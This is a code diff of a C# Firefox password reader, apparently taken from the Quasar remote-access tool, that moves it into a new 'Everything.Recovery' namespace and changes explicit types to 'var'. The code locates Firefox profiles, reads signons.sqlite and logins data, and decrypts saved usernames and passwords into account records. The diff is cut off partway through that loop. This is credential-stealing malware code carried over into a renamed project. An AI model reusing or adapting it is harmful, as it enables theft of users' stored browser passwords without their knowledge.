@@ -1,13 +1,14 @@
-﻿using Newtonsoft.Json;
+﻿using Everything.Recovery;
+using Everything.Recovery.Utilities;
+using Newtonsoft.Json;
 using Newtonsoft.Json.Linq;
-using Quasar.Client.Recovery.Utilities;
 using Quasar.Common.Models;
 using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Text;
 
-namespace Quasar.Client.Recovery.Browsers
+namespace Everything.Recovery.Browsers
 {
     public class FirefoxPassReader : IAccountReader
     {
@@ -17,20 +18,20 @@ namespace Quasar.Client.Recovery.Browsers
         /// <inheritdoc />
         public IEnumerable<RecoveredAccount> ReadAccounts()
         {
-            string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
+            var dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
 
             var logins = new List<RecoveredAccount>();
             if (dirs.Length == 0)
                 return logins;
 
-            foreach (string dir in dirs)
+            foreach (var dir in dirs)
             {
-                string signonsFile = string.Empty;
-                string loginsFile = string.Empty;
-                bool signonsFound = false;
-                bool loginsFound = false;
+                var signonsFile = string.Empty;
+                var loginsFile = string.Empty;
+                var signonsFound = false;
+                var loginsFound = false;
 
-                string[] files = Directory.GetFiles(dir, "signons.sqlite");
+                var files = Directory.GetFiles(dir, "signons.sqlite");
                 if (files.Length > 0)
                 {
                     signonsFile = files[0];
@@ -68,7 +69,7 @@ namespace Quasar.Client.Recovery.Browsers
                             if (!sqlDatabase.ReadTable("moz_logins"))
                                 return logins;
 
-                            for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
+                            for (var i = 0; i < sqlDatabase.GetRowCount(); i++)
                             {
                                 try
                                 {
@@ -112,8 +113,8 @@ namespace Quasar.Client.Recovery.Browsers
 
                             foreach (var loginData in ffLoginData.Values())
                             {
-                                string username = decrypter.Decrypt(loginData["encryptedUsername"].ToString());
-                                string password = decrypter.Decrypt(loginData["encryptedPassword"].ToString());
+                                var username = decrypter.Decrypt(loginData["encryptedUsername"].ToString());
+                                var password = decrypter.Decrypt(loginData["encryptedPassword"].ToString());
                                 logins.Add(new RecoveredAccount
                                 {
                                     Username = username,
